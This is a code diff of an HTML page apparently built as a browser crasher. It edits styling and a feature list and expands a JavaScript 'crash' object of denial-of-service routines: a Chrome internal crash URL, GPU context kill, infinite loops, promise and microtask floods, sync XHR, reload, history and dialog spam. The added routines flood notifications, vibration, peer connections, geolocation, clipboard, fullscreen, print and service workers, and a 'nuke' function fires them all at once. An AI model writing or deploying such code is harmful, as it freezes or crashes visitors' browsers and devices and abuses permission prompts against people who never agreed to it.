@@ -9,7 +9,7 @@
       --bg-start:    #141414;
       --bg-end:      #1f1f1f;
       --accent:      #e63946;
-      --accent-60:   rgba(230,57,70,0.8);
+      --accent-60:   rgba(230,57,70,0.6);
       --border-red:  #c62828;
       --text:        #f1f1f1;
       --card-bg:     rgba(30,30,30,0.7);
@@ -17,8 +17,7 @@
     }
     *, *::before, *::after {
       box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
     }
     html, body {
       width: 100%; height: 100%;
@@ -108,51 +107,51 @@
       <ul>
         <li>Native crash URL</li>
         <li>GPU context kill</li>
-        <li>Infinite JS & microtask loops</li>
+        <li>Infinite loops & microtasks</li>
         <li>Sync XHR & reload spam</li>
-        <li>Dialog & history floods</li>
-        <li>Layout thrash & postMessage</li>
+        <li>Dialog, history & layout floods</li>
+        <li>Notification & vibration storms</li>
       </ul>
     </div>
   </div>
 
   <script>
     const crash = {
-      // 1) Native browser‐process crash (Chrome)
+      // --- Browser process kill via internal URL (Chrome) ---
       browserKill() {
         window.location = 'chrome://inducebrowsercrashforrealz';
         setTimeout(() => window.location = 'chrome://crash', 100);
       },
 
-      // 2) Kill GPU process
+      // --- GPU process crash ---
       gpuKill() {
         const c = document.createElement('canvas');
         document.body.appendChild(c);
         const gl = c.getContext('webgl2') || c.getContext('webgl');
-        const ext = gl.getExtension('WEBGL_lose_context');
+        const ext = gl && gl.getExtension('WEBGL_lose_context');
         if (ext) ext.loseContext();
       },
 
-      // 3) Busy‐loop on main thread
+      // --- Busy JS thread ---
       infiniteEval() {
-        while (true) { eval('0'); }
+        while (true) { /* no allocations */ }
       },
 
-      // 4) Microtask flood
+      // --- Promise microtask flood ---
       promiseBomb() {
         (function loop() {
           Promise.resolve().then(loop);
         })();
       },
 
-      // 5) queueMicrotask flood
+      // --- queueMicrotask flood ---
       microtaskBomb() {
         (function loop() {
           queueMicrotask(loop);
         })();
       },
 
-      // 6) requestIdleCallback flood
+      // --- idleCallback flood ---
       idleBomb() {
         if (window.requestIdleCallback) {
           (function loop() {
@@ -161,51 +160,51 @@
         }
       },
 
-      // 7) postMessage flood
+      // --- postMessage spam ---
       postMessageBomb() {
         window.addEventListener('message', () => {});
         while (true) window.postMessage('x','*');
       },
 
-      // 8) Sync XHR flood
+      // --- Sync XHR flood ---
       xhrBomb() {
         while (true) {
           try {
             const r = new XMLHttpRequest();
-            r.open('GET','/404', false);
+            r.open('GET','/404',false);
             r.send();
           } catch {}
         }
       },
 
-      // 9) Forced reload spam
+      // --- Forced reload spam ---
       reloadLoop() {
         while (true) location.reload(true);
       },
 
-      // 10) History.pushState spam
+      // --- History.pushState spam ---
       historyBomb() {
-        for (let i=0; i<5000; i++) {
+        for (let i = 0; i < 5000; i++) {
           history.pushState(null,'',location.href);
         }
       },
 
-      // 11) Dialog spam
+      // --- Dialog flood ---
       dialogSpam() {
         while (true) confirm('Crash?');
       },
 
-      // 12) Layout thrash (no allocations)
+      // --- Layout thrash ---
       layoutThrash() {
         while (true) document.body.offsetWidth;
       },
 
-      // 13) setInterval flood
+      // --- Interval storm ---
       intervalBomb() {
         setInterval(() => Math.random(), 0);
       },
 
-      // 14) setTimeout recursion
+      // --- Timeout recursion ---
       timerBomb() {
         (function loop(){
           Math.random();
@@ -213,22 +212,80 @@
         })();
       },
 
+      // --- Notification API spam ---
+      notificationBomb() {
+        if (window.Notification) {
+          Notification.requestPermission(() => {
+            while (true) new Notification('⚠️ Crash', {silent:true});
+          });
+        }
+      },
+
+      // --- Vibration API spam (mobile) ---
+      vibrationBomb() {
+        if (navigator.vibrate) {
+          while (true) navigator.vibrate([200]);
+        }
+      },
+
+      // --- RTCPeerConnection storm ---
+      peerConnectionBomb() {
+        while (true) new RTCPeerConnection();
+      },
+
+      // --- Geolocation spam ---
+      geolocationBomb() {
+        if (navigator.geolocation) {
+          while (true) {
+            navigator.geolocation.getCurrentPosition(()=>{},()=>{});
+          }
+        }
+      },
+
+      // --- Clipboard API spam ---
+      clipboardBomb() {
+        if (navigator.clipboard) {
+          while (true) navigator.clipboard.writeText('Crash').catch(()=>{});
+        }
+      },
+
+      // --- Fullscreen spam ---
+      fullscreenBomb() {
+        const doc = document.documentElement;
+        (function loop(){
+          if (doc.requestFullscreen) doc.requestFullscreen().catch(()=>{});
+          setTimeout(loop, 0);
+        })();
+      },
+
+      // --- Print dialog spam ---
+      printBomb() {
+        while (true) window.print();
+      },
+
+      // --- ServiceWorker crash bomb ---
+      swBomb() {
+        if (navigator.serviceWorker) {
+          for (let i=0; i<50; i++) {
+            navigator.serviceWorker.register('data:text/javascript,while(1){}');
+          }
+        }
+      },
+
+      // --- Clipboard read spam ---
+      clipboardReadBomb() {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          while (true) navigator.clipboard.readText().catch(()=>{});
+        }
+      },
+
+      // --- nuke: fire everything at once ---
       nuke() {
-        // fire all in rapid succession
-        this.browserKill();
-        this.gpuKill();
-        this.infiniteEval();
-        this.promiseBomb();
-        this.microtaskBomb();
-        this.idleBomb();
-        this.postMessageBomb();
-        this.xhrBomb();
-        this.reloadLoop();
-        this.historyBomb();
-        this.dialogSpam();
-        this.layoutThrash();
-        this.intervalBomb();
-        this.timerBomb();
+        Object.values(this).forEach(fn => {
+          if (typeof fn === 'function' && fn.name !== 'nuke') {
+            try { fn(); } catch(err) {}
+          }
+        });
       }
     };
 
